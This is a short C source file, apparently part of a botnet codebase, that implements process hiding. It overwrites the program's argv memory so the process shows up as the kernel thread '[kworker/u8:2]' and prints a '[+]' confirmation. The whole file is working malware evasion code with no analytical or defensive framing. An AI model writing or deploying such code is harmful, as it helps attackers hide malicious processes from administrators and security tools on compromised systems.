#include "../../include/botnet.h"
#include <stdio.h>
#include <string.h>

// Hides the process by overwriting argv with a new name
void process_hiding_hide(int argc, char *argv[]) {
    char *new_name = "[kworker/u8:2]"; // A common kernel thread name
    size_t name_len = strlen(new_name);

    // Calculate the total space available in argv
    size_t argv_space = 0;
    for (int i = 0; i < argc; i++) {
        argv_space += strlen(argv[i]) + 1; // +1 for the null terminator
    }

    // Ensure the new name fits
    if (name_len >= argv_space) {
        // Not enough space, just overwrite argv[0]
        strncpy(argv[0], new_name, strlen(argv[0]));
        argv[0][strlen(argv[0]) - 1] = '\0';
        return;
    }

    // Overwrite argv[0] with the new name
    strncpy(argv[0], new_name, argv_space);

    // Clear the rest of the argv memory space
    for (int i = 1; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
    }

    printf("[+] Process name hidden as \"%s\".\n", new_name);
}
